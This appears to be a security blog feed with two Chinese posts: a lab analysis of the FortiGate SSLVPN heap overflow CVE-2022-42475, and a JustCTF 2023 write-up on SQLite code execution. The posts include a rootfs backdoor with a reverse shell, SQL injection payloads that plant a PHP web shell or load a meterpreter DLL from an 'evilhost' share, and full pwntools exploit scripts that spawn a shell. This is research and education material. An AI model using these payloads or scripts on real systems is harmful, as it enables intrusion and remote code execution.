    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<p>原文链接：<a href="https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html">https://bestwing.me/CVE-2022-42475-FortiGate-SSLVPN-HeapOverflow.html</a></p><h2 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h2><p>这两天和 @leommxj 一起分析了和写了一下  CVE-2023-27997 的漏洞利用， 顺便一想想 CVE-2022-42475 这个漏洞也过去蛮久的了，于是准备把这篇 CVE-2022-42475 漏洞分析分享出来。注：本文不含完整的漏洞利用脚本。</p><p>下图为 CVE-2023-27997  的利用录屏， 与本文要讲的 CVE-2022-42475  无关</p><blockquote class="twitter-tweet"><p lang="en" dir="ltr">I learned a lot from <a href="https://twitter.com/cfreal_?ref_src=twsrc%5Etfw">@cfreal_</a> , and it&#39;s great to write exploits together with <a href="https://twitter.com/leommxj?ref_src=twsrc%5Etfw">@leommxj</a>.<a href="https://twitter.com/hashtag/CVE?src=hash&amp;ref_src=twsrc%5Etfw">#CVE</a>-2023-27997 <a href="https://t.co/nEFndgvoVD">pic.twitter.com/nEFndgvoVD</a></p>&mdash; swing (@bestswngs) <a href="https://twitter.com/bestswngs/status/1669969165392953344?ref_src=twsrc%5Etfw">June 17, 2023</a></blockquote> <script async src="https://platform.twitter.com/widgets.js" charset="utf-8"></script><p>注：这篇笔记成文于 2023-02-28 ， 发表于 2023-06-18</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><p>2022 年 12 月 12 日，Fortinet 官方发布了影响 FortiGate SSLVPN 的 RCE 漏洞 CVE-2022-42475 相关信息。本文对此漏洞的成因进行分析。</p><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>测试版本为 7.2.2， 环境的安装和部署可以参考这篇文章：  <a href="https://blog.csdn.net/meigang2012/article/details/87903878%E3%80%82">https://blog.csdn.net/meigang2012/article/details/87903878。</a> 另外感谢下 @explorer 网管大哥在部署环境上的帮助。</p><p>导入虚拟机后需要配置下网络， 参考 <a href="https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1">https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1</a></p><p>有个重点 dns 要设置下：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">config system dns</span><br><span class="line"><span class="built_in">set</span> primary &lt;Primary DNS server&gt;</span><br><span class="line"><span class="built_in">set</span> secondary &lt;Secondary DNS server&gt;</span><br><span class="line">end</span><br><span class="line"></span><br><span class="line"><span class="comment"># The default DNS servers are 208.91.112.53 and 208.91.112.52.</span></span><br></pre></td></tr></table></figure><p>需要配置一个 sslvpn ，然后能访问即可。</p><h2 id="设备权限获取"><a href="#设备权限获取" class="headerlink" title="设备权限获取"></a>设备权限获取</h2><p>挂载虚拟机 vmdk 硬盘后， 可以看到有个 rootfs.gz 文件。 </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">root@Jas-22:/home/user/Desktop/fuck-fortigate/rootfs<span class="comment"># ls</span></span><br><span class="line">bin  bin.tar.xz  boot  data  data2  dev  etc  fortidev  init  lib  lib64  migadmin.tar.xz  node-scripts.tar.xz  proc  sbin  sys  tmp  usr  usr.tar.xz  usr.tar.xz.chk  var</span><br></pre></td></tr></table></figure><p>可以看到有如下内容， 我们需要进一步解压  <code>bin.tar.xz</code> 文件夹，使用 sbin 目录自带的命令解压</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">chroot . /sbin/xz --check=sha256 -d /bin.tar.xz</span><br><span class="line">chroot . /sbin/ftar -xf /bin.tar</span><br><span class="line">chroot . /sbin/xz --check=sha256 -d /migadmin.tar.xz</span><br><span class="line">chroot . /sbin/ftar -xf /migadmin.tar</span><br></pre></td></tr></table></figure><p>然后需要在 bin 目录中放入后门，第一个是生成一个反弹shell替换  smartctl 文件， 以及我这里放入一个 busybox ，做一个软链接 <code>ln -sn /bin/busybox bin/sh</code> 设备中默认没有  bash （sh）文件 （或者说他的 sh 功能比较鸡肋）， 然后重新打包。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 重新打包 bin 文件夹</span></span><br><span class="line">chroot . sbin/ftar -cf bin.tar bin</span><br><span class="line">chroot . sbin/xz --check=sha256 -e bin.tar</span><br><span class="line"><span class="comment"># 重新打包 rootfs</span></span><br><span class="line">find . | cpio -H newc -o &gt; ../rootfs.raw</span><br><span class="line">cat ./rootfs.raw | gzip &gt; rootfs.gz</span><br></pre></td></tr></table></figure><p>重打包完成后， 我们需要过几个校验，才能正常启动系统。</p><p>vmlinux ： </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-6dbab4847a64cb84dff1b31c4e8e49b1-302eb4.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-6dbab4847a64cb84dff1b31c4e8e49b1-302eb4.png"></a></p><p>解下来是 bin/init：</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-c887601385826f00ca523269f2551e12-419102.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-c887601385826f00ca523269f2551e12-419102.png"></a></p><p>这里会校验 fgtsum ， 失败直接给你重启最后是 rootfs 检查</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-b76899fa4e7c4c68e04166ca06b38b05-3f7506.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-03-b76899fa4e7c4c68e04166ca06b38b05-3f7506.png"></a></p><p>由于，我是采用 vmware +  gdb 的调试方式， 即 <a href="https://bestwing.me/Linux_Kernel_Debugging_with_VMware_and_GDB.html">使用VMware和GDB进行Linux内核调试 (bestwing.me)</a>， 因此我直接写了一个 gdb python 脚本动态修改返回值即可：</p><blockquote><p>这里皮一句，依稀记得这段代码是 chatGPT 帮我生成的。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gdb</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">SetRaxBreakpoint</span>(<span class="params">gdb.Breakpoint</span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, bp_expr, rax_value, temporary=<span class="literal">False</span></span>):</span></span><br><span class="line">        gdb.Breakpoint.__init__(self, bp_expr, gdb.BP_BREAKPOINT, <span class="literal">False</span>, temporary )</span><br><span class="line">        <span class="comment"># super(SetRaxBreakpoint, self).__init__(spec, temporary)</span></span><br><span class="line">        self.rax_value = rax_value</span><br><span class="line">        self.silent = <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">stop</span>(<span class="params">self</span>):</span></span><br><span class="line">        gdb.execute(<span class="string">&#x27;set $rax = &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(self.rax_value))</span><br><span class="line"></span><br><span class="line">gdb.execute(<span class="string">&#x27;set architecture i386:x86-64&#x27;</span>)</span><br><span class="line">gdb.execute(<span class="string">&#x27;set pagination off&#x27;</span>)</span><br><span class="line"></span><br><span class="line">r1 = SetRaxBreakpoint(<span class="string">&#x27;*0xffffffff807ac11c&#x27;</span>, <span class="number">0</span>)</span><br><span class="line">r2 = SetRaxBreakpoint(<span class="string">&#x27;*0x4518C9&#x27;</span>, <span class="number">1</span>) <span class="comment"># </span></span><br><span class="line">r3 = SetRaxBreakpoint(<span class="string">&#x27;*0x277fccc&#x27;</span>, <span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>当系统成功执行后，使用 <code>diagnose hardware smartctl </code> 即可运行我们的后门文件。</p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><h3 id="Root-Cause"><a href="#Root-Cause" class="headerlink" title="Root Cause"></a>Root Cause</h3><p>在处理用户 POST 数据的时候， </p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-f8922630b29d5da26852daf138d53568-c35f78.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-f8922630b29d5da26852daf138d53568-c35f78.png"></a></p><p>会根据 http header 中的  <code>content-length</code>字段分配 buffer ， 然而在分配之前， 即在调用 pool_alloc 函数之前</p><blockquote><p> pool_alloc 有两个参数,  第二个为即将要分配的buffer 大小</p></blockquote><p>rax 为用户请求结构体指针，偏移位置 0x18 存放了 CL 值。先将 CL 放在 eax 寄存器中，使用 lea 指令将其加一后放在 esi 寄存器，再用 movsxd 扩展为 64 bit 值。</p><p>在调用 pool_alloc 函数时使用 32 位数值 + 1 拓展成 64 位的方法，这里存在整数溢出。那么我们可以构造特殊的 CL 值，比如 0x1b00000000，经过运算拓展之后会变成 0x1 。会分配一个小的内存空间导致溢出</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-128350f0bec9a51748ab3b63b116a7ce-981162.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-128350f0bec9a51748ab3b63b116a7ce-981162.png"></a></p><p>上面这个是断点是初始化 buffer ， 可以看到大小是 1,  之后在 memcpy 处就 会溢出。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-6b4a0c20901bb1fb02d0126a5149423b-28adec.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-6b4a0c20901bb1fb02d0126a5149423b-28adec.png"></a></p><h3 id="exploit"><a href="#exploit" class="headerlink" title="exploit"></a>exploit</h3><p>这里首先明确一下，我不会公开完整的利用，这里这提一点利用上的思路。利用整体思路参考 Orange 2017 年的文章， 大致思路就是进行进行竞争， 一边在堆上布局 SSL 结构体，一边触发漏洞，然后溢出覆盖 SSL 结构体。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-da548c387796e997639b84cc9298d0d2-3fc09e.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-da548c387796e997639b84cc9298d0d2-3fc09e.png"></a></p><p>之后就可以控制 PC ， 当我们控制 PC 后我们需要确定 padding ， 这个步骤比较繁琐， 我拿 PoC 改了一个循环 fuzz 的脚本。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">do_exploit</span>(<span class="params">padding</span>):</span></span><br><span class="line"> ...</span><br><span class="line"> payload = p64(ret) * padding + <span class="string">&#x27;A&#x27;</span> * <span class="number">0x1000</span></span><br><span class="line"> ...</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">123</span>, <span class="number">384</span>):</span><br><span class="line">    padding = <span class="built_in">int</span>(i )</span><br><span class="line">    <span class="keyword">if</span> do_exploit(padding):</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;timeout ...&#x27;</span>)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>然后对 ret 这个gadget 下一个断点， 当触发断点的时候， 脚本会因为timeout  触发异常，然后这附近大概就是咱们的padding。</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-4f7aaf1a3306a4fe035b064f9bcd4e21-284979.png" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-03-01-4f7aaf1a3306a4fe035b064f9bcd4e21-284979.png"></a></p><p>然后这个时候只需要找栈迁移的gadget 即可。这里我找了的 <code> push rdx ; add bl, byte ptr [rbx + 0x41] ; pop rsp ; pop rbp ; ret</code> ， 这个gadget ， 正好可以将栈迁移到  rdi 寄存器所指向的内存地址上。然后将剩下 ret 指令的替换成 <code>pop rax ; ret</code><br>这样的gadget， 这样就能一直迁移到可控制的 <code>AAAAAAA</code> 的地方进行 rop 链了。</p><blockquote><p>再阅读这一部分的内容，我突然反应过来其实不需要替换指令， 当前的 ret 指令就足够迁移到可控的 <code>AAAA</code> 的位置进行 ROP 了</p></blockquote><p>由于 fortigate 的这个程序很大，正如 <a href="https://twitter.com/hashtag/CVE?src=hashtag_click">CVE</a>-2023-27997 的作者所说的，</p><p><a href="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-18-052405000e893e38eafc4cdbda2afe2c-4a9f3b.png" title="image-20230618171021882" class="gallery-item"><img src="https://sw-blog.oss-cn-hongkong.aliyuncs.com/img/2023-06-18-052405000e893e38eafc4cdbda2afe2c-4a9f3b.png" alt="image-20230618171021882"></a></p><p>该程序很大，想找到适合的 gadget 来组成 ropchain 仅仅需要花费一点时间就行了。</p><h2 id="参考连接"><a href="#参考连接" class="headerlink" title="参考连接"></a>参考连接</h2><p><a href="https://blog.csdn.net/meigang2012/article/details/87903878">飞塔老梅子的博客-CSDN博客</a></p><p><a href="https://docs.fortinet.com/document/fortigate-private-cloud/7.2.0/vmware-esxi-administration-guide/615472/configuring-port-1">Configuring port 1 | FortiGate Private Cloud 7.2.0 (fortinet.com)</a></p><p><a href="https://devco.re/blog/2019/08/09/attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn/">attacking-ssl-vpn-part-2-breaking-the-Fortigate-ssl-vpn</a></p><p><a href="https://bestwing.me/Linux_Kernel_Debugging_with_VMware_and_GDB.html">使用VMware和GDB进行Linux内核调试 (bestwing.me)</a></p><p><a href="https://wzt.ac.cn/2022/12/15/CVE-2022-42475/">CVE-2022-42475 | CataLpa’s Site (wzt.ac.cn)</a></p><p><a href="https://www.cnblogs.com/studyskill/p/6524672.html">fortios 5.4后门植入</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
    
    
    <summary type="html">CVE-2022-42475</summary>
    
    
    
    <category term="漏洞分析" scheme="https://bestwing.me/categories/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
    
    <category term="pwn" scheme="https://bestwing.me/tags/pwn/"/>
    
    <category term="CVE-2022-42475" scheme="https://bestwing.me/tags/CVE-2022-42475/"/>
    
  </entry>
  
  <entry>
    <title>从JustCTF 2023 中学到的一点关于 sqlite3 代码执行的方法</title>
    <link href="https://bestwing.me/How-to-hacked-sqlite.html"/>
    <id>https://bestwing.me/How-to-hacked-sqlite.html</id>
    <published>2023-06-04T16:00:00.000Z</published>
    <updated>2023-06-06T01:21:36.049Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/hint.css/2.4.1/hint.min.css"><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="TL-DR"><a href="#TL-DR" class="headerlink" title="TL; DR"></a>TL; DR</h1><p>周末简单看了下 JustCTF 2023 的题目， 主要是三个题目吸引了我的注意， 分别是 notabug 、notabug2 和Windytooth。 其中前面两个是和 sqlite3 相关的题目。再次学到了一点利用方式。</p><h3 id="Known-Attacks-on-SQLite"><a href="#Known-Attacks-on-SQLite" class="headerlink" title="Known Attacks on SQLite"></a>Known Attacks on SQLite</h3><p>在BlackHat 2017 长亭科技的 slide 中提到两种众所周知的方法： <sup id="fnref:1"><a href="#fn:1" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://www.blackhat.com/docs/us-17/wednesday/us-17-Feng-Many-Birds-One-Stone-Exploiting-A-Single-SQLite-Vulnerability-Across-Multiple-Software.pdf">[1]</span></a></sup></p><h4 id="Attach-Database"><a href="#Attach-Database" class="headerlink" title="Attach Database"></a>Attach Database</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">?id&#x3D;bob&#39;; ATTACH DATABASE &#39;&#x2F;var&#x2F;www&#x2F;lol.php&#39; AS lol; CREATE TABLE lol.pwn </span><br><span class="line">(dataz text); INSERT INTO lol.pwn (dataz) VALUES (&#39;&lt;? system($_GET[&#39;cmd&#39;]); </span><br><span class="line">?&gt;&#39;;--</span><br></pre></td></tr></table></figure><p>通过写 <code>ATTACH DATABASE</code> 写文件， 然后执行 php 代码</p><h4 id="SELECT-load-extension"><a href="#SELECT-load-extension" class="headerlink" title="SELECT load_extension"></a>SELECT load_extension</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?name&#x3D;123 UNION SELECT </span><br><span class="line">1,load_extension(&#39;\\evilhost\evilshare\meterpreter.dll&#39;,&#39;DllMain&#39;);--</span><br></pre></td></tr></table></figure><p>在能上传文件的情况在， 且加载扩展的功能必须打开 <sup id="fnref:2"><a href="#fn:2" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://www.sqlite.org/c3ref/load_extension.html">[2]</span></a></sup> 。在 JustCTF 的 notabug 中也用到这个技巧</p><figure class="highlight python"><figcaption><span>title: "exploit for notabug (JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;, &#x27;-F&#x27; &#x27;#&#123;pane_pid&#125;&#x27;, &#x27;-P&#x27;]</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./pwn&#x27;)</span></span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line">p = remote(<span class="string">&quot;0.0.0.0&quot;</span>,<span class="number">13337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;CREATE TABLE images(name TEXT, type TEXT, img BLOB);&quot;</span>)</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;./exp.so&quot;</span>,<span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    dt = f.read()</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;INSERT INTO images(name,type,img)&quot;</span>)</span><br><span class="line"></span><br><span class="line">dt = binascii.hexlify(dt)</span><br><span class="line"><span class="comment"># warning(chr(dt[1]))</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(dt.decode())</span><br><span class="line"><span class="comment"># input()</span></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">f&quot;VALUES(&#x27;icon&#x27;,&#x27;jpeg&#x27;,cast(x&#x27;<span class="subst">&#123;dt.decode()&#125;</span>&#x27; as text));&quot;</span>)</span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;SELECT writefile(&#x27;./exp.so&#x27;,img) FROM images WHERE name=&#x27;icon&#x27;;&quot;</span>)</span><br><span class="line"><span class="comment"># print(hex(int(p.readline())))</span></span><br><span class="line">sla(<span class="string">b&quot;&gt; &quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;./exp&#x27;,&#x27;exp&#x27;);&quot;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3 id="learned-from-JustCTF"><a href="#learned-from-JustCTF" class="headerlink" title="learned from JustCTF"></a>learned from JustCTF</h3><p>那么如果我们不能上传文件的时候如何利用 <code>load_extension</code> ，方法来做命令执行呢？</p><h4 id="load-libc-so"><a href="#load-libc-so" class="headerlink" title="load libc.so"></a>load libc.so</h4><p>我们可以通过 <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;puts&#39;);</code>  来执行任意的 glibc 方法，例如这里的思路是</p><p>通过 puts 、gets  为预测堆地址，并写入我们的结构，然后爆破堆地址让他在执行 system 的时候,确保是执行我们想要的命令。 exploit 来自 @n132</p><figure class="highlight python"><figcaption><span>title:"exploit for notabug2(JustCTF 2023)"</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./sqlite3&quot;)</span></span><br><span class="line"><span class="comment">#context.log_level=&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = remote(&quot;0.0.0.0&quot;,13339)</span></span><br><span class="line">p = remote(<span class="string">&#x27;notabug2.nc.jctf.pro&#x27;</span>, <span class="number">1337</span>)</span><br><span class="line">ru         = <span class="keyword">lambda</span> a:     p.readuntil(a)</span><br><span class="line">r         = <span class="keyword">lambda</span> n:        p.read(n)</span><br><span class="line">sla     = <span class="keyword">lambda</span> a,b:     p.sendlineafter(a,b)</span><br><span class="line">sa         = <span class="keyword">lambda</span> a,b:     p.sendafter(a,b)</span><br><span class="line">sl        = <span class="keyword">lambda</span> a:     p.sendline(a)</span><br><span class="line">s         = <span class="keyword">lambda</span> a:     p.send(a)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;puts&#x27;);&quot;</span>)</span><br><span class="line">ru(<span class="string">&quot;: \n&quot;</span>)</span><br><span class="line">lic = u64(p.recvn(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">warning(<span class="built_in">hex</span>(lic))</span><br><span class="line">pie_base = lic - <span class="number">0x1589a0</span></span><br><span class="line"></span><br><span class="line">heap = <span class="number">0x00005555556b0000</span>-<span class="number">0x0000555555554000</span>+pie_base <span class="comment"># 1/0x2000</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># system_plt = (pie_base+0x2228C)</span></span><br><span class="line">system_plt = pie_base + <span class="number">0x10910</span></span><br><span class="line"><span class="keyword">if</span> pie_base &gt; <span class="number">0x600000000000</span>:</span><br><span class="line">    p.close()</span><br><span class="line">warning(<span class="built_in">hex</span>(pie_base)) <span class="comment">#lic+0x28b8</span></span><br><span class="line">sla(<span class="string">b&quot;lite&gt;&quot;</span>,<span class="string">b&quot;select Load_extension(&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;,&#x27;gets&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(p64(heap+<span class="number">0x11eb0</span>)+<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x8</span>+p64(pie_base+<span class="number">0x000000000009e0ad</span>))</span><br><span class="line"><span class="comment"># raw_input()</span></span><br><span class="line">dt = <span class="string">b&quot;/bin/sh\0&quot;</span>+flat([<span class="number">0</span>]*<span class="number">8</span>)+ flat([<span class="number">0</span>]*<span class="number">8</span>)+ p64(system_plt)</span><br><span class="line">sla(<span class="string">b&quot;lite&gt; &quot;</span>,<span class="string">f&quot;select cast(x&#x27;<span class="subst">&#123;dt.<span class="built_in">hex</span>()&#125;</span>&#x27; as text), &quot;</span>.encode()+<span class="string">b&quot;Load_extension(&#x27;&quot;</span>+p64(system_plt)[:<span class="number">6</span>]+<span class="string">b&quot;&#x27;,&#x27;/bin/sh&#x27;);&quot;</span>)</span><br><span class="line">p.sendline(<span class="string">b&quot;echo n132&quot;</span>)</span><br><span class="line"><span class="comment"># p.interactive()</span></span><br><span class="line">data = p.read(timeout=<span class="number">1</span>)</span><br><span class="line"><span class="keyword">if</span> <span class="string">b&#x27;n132&#x27;</span> <span class="keyword">in</span> data:</span><br><span class="line">    p.sendline(<span class="string">&quot;/jailed/readflag&quot;</span>)</span><br><span class="line">    <span class="built_in">input</span>()</span><br><span class="line">    p.interactive()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p.close()</span><br></pre></td></tr></table></figure><h4 id="system-execute-command"><a href="#system-execute-command" class="headerlink" title=".system execute command"></a>.system execute command</h4><p>在 <code>Command Line Shell For SQLite</code> 界面中， sqlite 是内置了一些方法的 <sup id="fnref:3"><a href="#fn:3" rel="footnote"><span class="hint--top hint--error hint--medium hint--rounded hint--bounce" aria-label="https://blog.csdn.net/liubingzhao/article/details/50885880">[3]</span></a></sup>  ，其中就包括了 <code>.system</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">.system CMD ARGS…Run CMD ARGS… in a system shell</span><br></pre></td></tr></table></figure><p>这是可以直接执行命令的，但是在 JustCTF 中， 程序做了限制</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># root @ pwnable in /tmp/private [14:10:59]</span></span><br><span class="line">$ cat run-sqlite.sh</span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">sed -ue <span class="string">&#x27;/^\./ &#123; /^\.open/!d; &#125;&#x27;</span> | /jailed/sqlite3 -interactive<span class="comment">#</span></span><br></pre></td></tr></table></figure><p>这个正则的解释就是:</p><p>这个sed脚本的作用是从输入中筛选出特定的行。它使用正则表达式进行匹配。解释一下脚本的含义：</p><p>/^./：匹配以.开头的行。<br>{ /^.open/!d; }：对于匹配到的以.开头的行，如果行不以.open开头，则删除（d）该行。<br>因此，这个sed命令的作用是删除以.开头但不以.open开头的行。</p><p>因此通常而言我们是不能直接执行 <code>.system</code> 命令的，但是如果和 <code>select Load_extension(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;,&#39;getchar&#39;);</code> 配合就可以了， 这是 @crazyman 赛后发现的。 